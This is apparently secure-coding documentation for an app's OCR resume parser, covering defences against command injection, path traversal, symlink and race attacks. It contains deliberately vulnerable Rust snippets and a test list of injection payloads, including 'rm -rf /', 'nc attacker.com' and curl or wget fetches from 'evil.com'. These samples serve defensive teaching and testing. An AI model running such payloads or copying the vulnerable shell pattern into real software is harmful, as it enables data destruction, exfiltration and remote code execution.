# OCR and Command Execution Security

> JobSentinel Security Documentation

---

## Overview

JobSentinel's Resume Parser includes OCR (Optical Character Recognition) support for extracting text from
scanned PDF resumes. This feature requires executing external command-line tools (`tesseract` and `pdftoppm`),
which introduces security risks if not properly implemented.

This document describes the security measures in place to prevent command injection, path traversal, and other
command execution vulnerabilities.

## OCR Architecture

### Dependencies

JobSentinel's OCR feature uses two external tools:

1. **Tesseract OCR**: Extracts text from images
   - macOS: `brew install tesseract`
   - Linux: `apt install tesseract-ocr`
   - Windows: Download from GitHub releases

2. **Poppler (pdftoppm)**: Converts PDF pages to images
   - macOS: `brew install poppler`
   - Linux: `apt install poppler-utils`
   - Windows: Download poppler binaries

### Workflow

```text
PDF File → pdftoppm → PNG Images → tesseract → Extracted Text
```

**File**: `src-tauri/src/core/resume/parser.rs`

## Security Threats

### 1. Command Injection

**Threat**: Attacker provides malicious input that gets executed as a shell command.

```rust
// ❌ VULNERABLE: Shell injection risk
let command = format!("tesseract {} output", user_provided_path);
std::process::Command::new("sh")
    .arg("-c")
    .arg(&command)  // Arbitrary command execution!
    .output()?;
```

**Attack Example**:

```text
user_provided_path = "file.pdf; rm -rf /"
Executes: tesseract file.pdf; rm -rf / output
```

### 2. Path Traversal

**Threat**: Attacker provides paths like `../../etc/passwd` to access files outside allowed directories.

```rust
// ❌ VULNERABLE: Path traversal
let file_path = format!("/resumes/{}", user_input);
let text = parse_pdf(&file_path)?;
```

**Attack Example**:

```text
user_input = "../../../../etc/shadow"
Accesses: /resumes/../../../../etc/shadow → /etc/shadow
```

### 3. Symlink Attacks

**Threat**: Attacker creates a symlink in the temp directory pointing to sensitive files.

```rust
// ❌ VULNERABLE: Symlink not validated
let temp_file = temp_dir.join("output.png");
// If temp_file is a symlink to /etc/passwd...
tesseract_command.arg(&temp_file); // Might overwrite /etc/passwd
```

### 4. Race Conditions

**Threat**: Attacker replaces files between validation and use (TOCTOU - Time Of Check, Time Of Use).

```rust
// ❌ VULNERABLE: Race condition
if path.exists() && path.is_file() {
    // Attacker replaces file here!
    let content = std::fs::read(path)?;
}
```

## Security Measures

### 1. Path Canonicalization

**Purpose**: Resolve symlinks and prevent `../` traversal attacks.

```rust
/// Parse PDF file and extract text content
pub fn parse_pdf(&self, file_path: &Path) -> Result<String> {
    // Security: Canonicalize path to prevent path traversal attacks
    // This resolves symlinks and removes ../ components
    let canonical_path = file_path
        .canonicalize()
        .context(format!("Invalid or inaccessible path: {}", file_path.display()))?;

    // Security: Verify the canonical path still exists
    if !canonical_path.exists() {
        return Err(anyhow::anyhow!("File not found: {}", canonical_path.display()));
    }

    // Security: Verify the canonical path is a regular file
    if !canonical_path.is_file() {
        return Err(anyhow::anyhow!("Path is not a regular file: {}", canonical_path.display()));
    }

    // Verify it's a PDF file
    if canonical_path.extension().and_then(|s| s.to_str()) != Some("pdf") {
        return Err(anyhow::anyhow!("File must be a PDF. Got: {}", canonical_path.display()));
    }

    // Now safe to use canonical_path
    // ...
}
```

**What this prevents**:

- ✅ Path traversal: `../../etc/passwd` → Error
- ✅ Symlink attacks: Resolves to real file path
- ✅ Non-existent files: Caught before use
- ✅ Directories: Only regular files allowed
- ✅ Wrong file types: Must be `.pdf`

### 2. No Shell Invocation

**Purpose**: Pass arguments directly to avoid shell injection.

```rust
// ❌ UNSAFE: Uses shell
Command::new("sh")
    .arg("-c")
    .arg(format!("tesseract {} output", path))
    .output()?;

// ✅ SAFE: Direct command execution, no shell
Command::new("tesseract")
    .arg(path)           // Argument 1
    .arg("stdout")       // Argument 2
    .arg("-l")           // Argument 3
    .arg("eng")          // Argument 4
    .output()?;
```

**Why this is secure**:

- Arguments are passed as-is to the program
- No shell interpretation
- No globbing, expansion, or command substitution
- Special characters are literal values

### 3. Controlled Temp Directory

**Purpose**: Use UUID-named directories to prevent collisions and race conditions.

```rust
use uuid::Uuid;

// Create temp directory for intermediate files
let temp_dir = std::env::temp_dir()
    .join(format!("jobsentinel_ocr_{}", Uuid::new_v4()));

std::fs::create_dir_all(&temp_dir)
    .context("Failed to create temp directory for OCR")?;

// Ensure cleanup on exit
let temp_dir_cleanup = temp_dir.clone();
let _cleanup = scopeguard::guard((), |_| {
    let _ = std::fs::remove_dir_all(&temp_dir_cleanup);
});
```

**What this prevents**:

- ✅ Race conditions: UUID makes collisions impossible
- ✅ File overwrites: Each run uses unique directory
- ✅ Temp file leaks: `scopeguard` ensures cleanup
- ✅ Privilege escalation: No predictable paths

### 4. Output Path Validation

**Purpose**: Ensure generated files stay within the controlled temp directory.

```rust
// Convert PDF pages to images
let output_prefix = temp_dir.join("page");

let pdftoppm_result = Command::new("pdftoppm")
    .arg("-png")
    .arg("-r")
    .arg("300")
    .arg(file_path)      // Canonicalized in parse_pdf()
    .arg(&output_prefix) // Controlled temp directory
    .output();

// Security: Validate all generated image files
let mut image_paths: Vec<PathBuf> = std::fs::read_dir(&temp_dir)?
    .filter_map(|e| e.ok())
    .map(|e| e.path())
    .filter(|p| {
        // Extension check
        if p.extension().map(|e| e == "png").unwrap_or(false) {
            // Security: Verify path is within temp_dir
            if let Ok(canonical) = p.canonicalize() {
                if let Ok(canonical_temp) = temp_dir.canonicalize() {
                    // Ensure canonical path is still in temp_dir
                    return canonical.starts_with(&canonical_temp) && canonical.is_file();
                }
            }
        }
        false
    })
    .collect();
```

**What this prevents**:

- ✅ Symlink attacks: Canonicalize before checking
- ✅ Directory escape: Must be within `temp_dir`
- ✅ Non-PNG files: Extension validation
- ✅ Directories: Must be regular files

### 5. Hardcoded Command Arguments

**Purpose**: Never allow user input to influence command flags.

```rust
// ✅ SAFE: All flags are hardcoded
let output = Command::new("tesseract")
    .arg(image_path)    // User data (but validated path)
    .arg("stdout")      // Hardcoded: output destination
    .arg("-l")          // Hardcoded: language flag
    .arg("eng")         // Hardcoded: English language
    .output()
    .context("Failed to run Tesseract OCR")?;

// ❌ UNSAFE: User controls flags
let output = Command::new("tesseract")
    .arg(image_path)
    .arg(user_output_mode)  // Could be "--config malicious.cfg"
    .arg("-l")
    .arg(user_language)     // Could be "../../../etc/passwd"
    .output()?;
```

**What this prevents**:

- ✅ Flag injection: Only predefined flags used
- ✅ Config file attacks: No user-controlled configs
- ✅ Output redirection: Output goes to `stdout`

### 6. Feature Flag Control

**Purpose**: OCR is opt-in and can be disabled at compile time.

```rust
// Cargo.toml
// [features]
// default = []
// ocr = ["dep:uuid", "dep:scopeguard"]
```

```rust
/// Check if OCR is available for scanned PDFs
pub fn is_ocr_available(&self) -> bool {
    #[cfg(feature = "ocr")]
    {
        self.ocr_available
    }

    #[cfg(not(feature = "ocr"))]
    {
        false
    }
}
```

**What this enables**:

- ✅ Reduced attack surface: OCR can be disabled
- ✅ Deployment flexibility: Enable only when needed
- ✅ Faster builds: Skip dependencies if not used

### 7. Runtime Tool Validation

**Purpose**: Check if external tools exist before attempting to use them.

```rust
/// Check if Tesseract OCR is available on the system
#[cfg(feature = "ocr")]
fn check_tesseract_available() -> bool {
    use std::process::Command;

    // Try to run tesseract --version
    Command::new("tesseract")
        .arg("--version")
        .output()
        .map(|output| output.status.success())
        .unwrap_or(false)
}

pub fn new() -> Self {
    #[cfg(feature = "ocr")]
    {
        let ocr_available = Self::check_tesseract_available();
        Self { ocr_available }
    }

    #[cfg(not(feature = "ocr"))]
    {
        Self {}
    }
}
```

**What this prevents**:

- ✅ Runtime errors: Gracefully handle missing tools
- ✅ Information disclosure: Don't expose system paths
- ✅ User confusion: Clear error messages

## Complete Security Flow

### Step-by-Step Validation

```rust
// 1. Canonicalize input path (resolves symlinks, removes ../)
let canonical_path = file_path.canonicalize()?;

// 2. Verify file exists
if !canonical_path.exists() { return Err(...); }

// 3. Verify it's a regular file (not directory/device)
if !canonical_path.is_file() { return Err(...); }

// 4. Verify file extension
if canonical_path.extension() != Some("pdf") { return Err(...); }

// 5. Create UUID-named temp directory
let temp_dir = std::env::temp_dir()
    .join(format!("jobsentinel_ocr_{}", Uuid::new_v4()));

// 6. Execute pdftoppm with validated paths
Command::new("pdftoppm")
    .arg("-png")                    // Hardcoded flag
    .arg("-r")                      // Hardcoded flag
    .arg("300")                     // Hardcoded value
    .arg(&canonical_path)           // Validated input
    .arg(&temp_dir.join("page"))    // Controlled output
    .output()?;

// 7. Validate each generated image file
for image_path in generated_images {
    let canonical_image = image_path.canonicalize()?;
    let canonical_temp = temp_dir.canonicalize()?;
    
    // Must be within temp_dir
    if !canonical_image.starts_with(&canonical_temp) {
        continue; // Skip
    }
    
    // Must be a regular file
    if !canonical_image.is_file() {
        continue;
    }
    
    // Must be PNG
    if canonical_image.extension() != Some("png") {
        continue;
    }
    
    // Now safe to process
    Command::new("tesseract")
        .arg(&canonical_image)  // Validated path
        .arg("stdout")          // Hardcoded
        .arg("-l")              // Hardcoded
        .arg("eng")             // Hardcoded
        .output()?;
}

// 8. Cleanup temp directory
std::fs::remove_dir_all(&temp_dir)?;
```

## Best Practices

### 1. Never use `sh -c` or similar shell invocation

```rust
// ❌ DANGEROUS
Command::new("sh").arg("-c").arg(user_input).output()?;
Command::new("bash").arg("-c").arg(user_input).output()?;
Command::new("cmd").arg("/C").arg(user_input).output()?;

// ✅ SAFE
Command::new("program").arg(arg1).arg(arg2).output()?;
```

### 2. Always canonicalize paths before use

```rust
// ✅ Canonicalize first
let path = user_input.canonicalize()?;

// Then validate
if !path.is_file() { return Err(...); }
if !path.starts_with(&allowed_dir) { return Err(...); }

// Now safe to use
process_file(&path)?;
```

### 3. Use allowlists for file extensions

```rust
const ALLOWED_EXTENSIONS: &[&str] = &["pdf", "png", "jpg"];

let ext = path.extension()
    .and_then(|s| s.to_str())
    .ok_or_else(|| anyhow!("No file extension"))?;

if !ALLOWED_EXTENSIONS.contains(&ext) {
    return Err(anyhow!("File type not allowed: {}", ext));
}
```

### 4. Use UUID for temp files/directories

```rust
use uuid::Uuid;

// ✅ Unpredictable, no collisions
let temp_file = format!("/tmp/jobsentinel_{}.tmp", Uuid::new_v4());

// ❌ Predictable, race conditions
let temp_file = format!("/tmp/jobsentinel_{}.tmp", user_id);
```

### 5. Always clean up temp files

```rust
use scopeguard::guard;

let temp_dir = create_temp_dir()?;

// Ensure cleanup even if function panics or returns early
let _cleanup = guard(temp_dir.clone(), |dir| {
    let _ = std::fs::remove_dir_all(&dir);
});

// Do work with temp_dir
// ...

// Cleanup happens automatically when _cleanup is dropped
```

### 6. Validate command output

```rust
let output = Command::new("tesseract")
    .arg(image_path)
    .arg("stdout")
    .output()?;

// Check exit status
if !output.status.success() {
    return Err(anyhow!("Tesseract failed: {}", 
        String::from_utf8_lossy(&output.stderr)));
}

// Validate output size
if output.stdout.len() > MAX_OUTPUT_SIZE {
    return Err(anyhow!("Output too large"));
}

// Convert to UTF-8
let text = String::from_utf8(output.stdout)
    .map_err(|_| anyhow!("Invalid UTF-8 output"))?;
```

## Testing Command Execution Security

### Unit Tests

```rust
#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_rejects_path_traversal() {
        let parser = ResumeParser::new();
        let result = parser.parse_pdf(Path::new("../../etc/passwd"));
        assert!(result.is_err());
    }

    #[test]
    fn test_rejects_non_pdf() {
        let parser = ResumeParser::new();
        let result = parser.parse_pdf(Path::new("/tmp/malicious.sh"));
        assert!(result.is_err());
    }

    #[test]
    fn test_rejects_directory() {
        let parser = ResumeParser::new();
        let result = parser.parse_pdf(Path::new("/tmp/"));
        assert!(result.is_err());
    }

    #[test]
    fn test_temp_dir_cleanup() {
        let parser = ResumeParser::new();
        let temp_count_before = count_temp_dirs();
        
        let _ = parser.parse_pdf(Path::new("test.pdf"));
        
        let temp_count_after = count_temp_dirs();
        assert_eq!(temp_count_before, temp_count_after);
    }
}
```

### Attack Simulation

```rust
#[test]
fn test_command_injection_attempts() {
    let parser = ResumeParser::new();
    
    let attack_paths = vec![
        "file.pdf; rm -rf /",
        "file.pdf && cat /etc/passwd",
        "file.pdf | nc attacker.com 1234",
        "$(curl http://evil.com/shell.sh)",
        "`wget http://evil.com/malware`",
    ];
    
    for path in attack_paths {
        let result = parser.parse_pdf(Path::new(path));
        assert!(result.is_err(), "Failed to reject: {}", path);
    }
}
```

## Related Documentation

- [URL Validation Security](./URL_VALIDATION.md)
- [Security Policy](../../SECURITY.md)
- [Resume Parser Implementation](../features/RESUME_PARSER.md)

## References

- [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [CWE-78: OS Command Injection](https://cwe.mitre.org/data/definitions/78.html)
- [CWE-22: Path Traversal](https://cwe.mitre.org/data/definitions/22.html)
- [Rust std::process::Command](https://doc.rust-lang.org/std/process/struct.Command.html)

---

**Last Updated**: 2026-01-24  
**Version**: 2.5.3  
**Security Level**: Production Ready
